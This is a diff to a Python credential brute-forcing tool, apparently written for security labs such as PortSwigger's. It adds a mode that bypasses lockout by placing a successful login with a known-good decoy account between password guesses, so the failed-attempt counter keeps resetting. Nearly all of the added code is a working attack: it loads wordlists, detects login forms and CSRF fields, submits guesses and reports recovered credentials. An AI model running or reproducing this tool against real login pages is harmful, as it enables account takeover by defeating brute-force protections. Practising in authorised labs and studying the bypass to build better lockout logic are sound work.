@@ -129,9 +129,10 @@ def load_userlist(filepath):
 def print_banner():
     print(colored("""
 ╔═══════════════════════════════════════════════════╗
-║         SCYFIX BRUTE FORCER v3.2                  ║
+║         SCYFIX BRUTE FORCER v3.3                  ║
 ║   Multi-Protocol Authentication Testing Tool      ║
 ║   Web | SSH | FTP | CSRF | Username Enum          ║
+║   Decoy-Interleaved IP-Block Bypass               ║
 ╚═══════════════════════════════════════════════════╝
 """, 'cyan'))
 
@@ -502,6 +503,93 @@ def username_enum(url, username_file, fail_string, password, delay, use_xff):
 
 
 # ════════════════════════════════════════════════════════════════
+#  DECOY-INTERLEAVED ATTACK (MODE 9)
+#  For brute-force protections where the failed-attempt counter resets
+#  on ANY successful login from that IP -- not just a login to the
+#  target account. We interleave a known-good decoy login between every
+#  real guess so the counter never reaches the lockout threshold.
+#  (e.g. PortSwigger "Broken brute-force protection, IP block")
+# ════════════════════════════════════════════════════════════════
+
+def decoy_interleave_attack(url, target_username, password_file, decoy_creds,
+                             fail_string, delay):
+    """
+    decoy_creds: list of (username, password) tuples known to log in
+    successfully. Rotated between guesses so the lockout counter keeps
+    resetting on a real success before it can trip.
+    """
+    print(colored("\n[*] Starting decoy-interleaved attack...", 'cyan'))
+    print(colored(f"[*] Target username: {target_username}", 'cyan'))
+    print(colored(f"[*] Decoy accounts: {[u for u, _ in decoy_creds]}", 'cyan'))
+
+    try:
+        with open(password_file, 'r', encoding='utf-8', errors='ignore') as f:
+            passwords = [p.strip() for p in f.read().splitlines() if p.strip()]
+    except FileNotFoundError:
+        print(colored(f"[-] Password file not found: {password_file}", 'red'))
+        return None
+
+    total = len(passwords)
+    print(colored(f"[*] Loaded {total} candidate passwords", 'cyan'))
+
+    session = requests.Session()
+    session.headers.update({
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+    })
+    session.get(url, timeout=10)
+
+    method, action, all_fields, _ = detect_form(url, session)
+    if not method:
+        print(colored("[-] Could not detect form -- exiting", 'red'))
+        return None
+
+    submit_field_names = ['login', 'submit', 'signin', 'btn', 'button']
+    submit_fields = {k: v for k, v in all_fields.items() if k.lower() in submit_field_names}
+    input_fields = {k: v for k, v in all_fields.items() if k.lower() not in submit_field_names}
+
+    username_field, password_field = identify_fields(input_fields, submit_fields)
+    csrf_field = detect_csrf_field(input_fields)
+
+    print(colored(f"\n[*] Attack started at {datetime.now().strftime('%H:%M:%S')}", 'cyan'))
+    print(colored("=" * 55, 'cyan'))
+
+    decoy_idx = 0
+    for count, password in enumerate(passwords, 1):
+        # 1. Fire a decoy login first -- a genuine success resets the
+        #    per-IP failed-attempt counter before we spend our guess.
+        decoy_user, decoy_pass = decoy_creds[decoy_idx % len(decoy_creds)]
+        decoy_idx += 1
+
+        sys.stdout.write(colored(
+            f"\r  [*] Resetting via decoy '{decoy_user}'...{' ' * 20}", 'yellow'))
+        sys.stdout.flush()
+
+        decoy_ok = web_attempt_login(url, session, method, action, all_fields,
+                                     username_field, password_field,
+                                     decoy_user, decoy_pass, fail_string, delay, csrf_field)
+        if not decoy_ok:
+            print(colored(
+                f"\n[!] Decoy login for '{decoy_user}' did not succeed -- "
+                "check the decoy credentials, the counter may not be resetting", 'red'))
+
+        # 2. Now spend the real guess against the target account.
+        sys.stdout.write(colored(
+            f"\r  [*] Trying ({count}/{total}): {target_username}:{password:<30}", 'red'))
+        sys.stdout.flush()
+
+        if web_attempt_login(url, session, method, action, all_fields, username_field,
+                             password_field, target_username, password, fail_string,
+                             delay, csrf_field):
+            print(colored(f"\n\n  [+] SUCCESS!", 'green'))
+            print(colored(f"  [+] Username: {target_username}", 'green'))
+            print(colored(f"  [+] Password: {password}", 'green'))
+            return target_username, password
+
+    print(colored(f"\n\n[-] Decoy-interleaved attack complete -- no valid credentials found", 'red'))
+    return None
+
+
+# ════════════════════════════════════════════════════════════════
 #  WEB ATTACK RUNNER
 # ════════════════════════════════════════════════════════════════
 
@@ -621,7 +709,8 @@ def main():
     print(colored("  6. FTP brute force", 'white'))
     print(colored("  7. Auto-detect protocol (SSH/FTP)", 'white'))
     print(colored("  8. Username enumeration (web)", 'white'))
-    mode = input(colored("\n[*] Enter mode (1-8): ", 'cyan'))
+    print(colored("  9. Decoy-interleaved attack (bypass counter-reset IP block)", 'white'))
+    mode = input(colored("\n[*] Enter mode (1-9): ", 'cyan'))
 
     if mode in ['1', '2', '3', '4']:
         url = input(colored("[*] Enter target login URL: ", 'cyan'))
@@ -697,6 +786,31 @@ def main():
                 print(colored("  4. All modes", 'white'))
                 pw_mode = input(colored("[*] Enter mode (1-4): ", 'cyan'))
                 run_web_attack(pw_mode, url, valid_usernames, fail_string2, delay2)
+
+    elif mode == '9':
+        url = input(colored("[*] Enter target login URL: ", 'cyan'))
+        target_username = input(colored("[*] Enter target username: ", 'cyan')).strip()
+        password_file = prompt_wordlist()
+        print(colored(
+            "[*] Enter decoy account(s) known to log in successfully "
+            "(these reset the lockout counter).", 'cyan'))
+        decoy_creds = []
+        while True:
+            decoy_user = input(colored(
+                "[*] Decoy username (ENTER to finish): ", 'cyan')).strip()
+            if not decoy_user:
+                break
+            decoy_pass = input(colored(
+                f"[*] Password for '{decoy_user}': ", 'cyan')).strip()
+            decoy_creds.append((decoy_user, decoy_pass))
+        if not decoy_creds:
+            print(colored("[-] No decoy accounts entered -- exiting", 'red'))
+            return
+        fail_string = input(colored("[*] Enter string that appears when login FAILS: ", 'cyan'))
+        delay = input(colored("[*] Delay between attempts (default 0.5): ", 'cyan'))
+        delay = float(delay) if delay.strip() else 0.5
+        decoy_interleave_attack(url, target_username, password_file, decoy_creds,
+                                fail_string, delay)
 
     else:
         print(colored("[-] Invalid mode selected", 'red'))
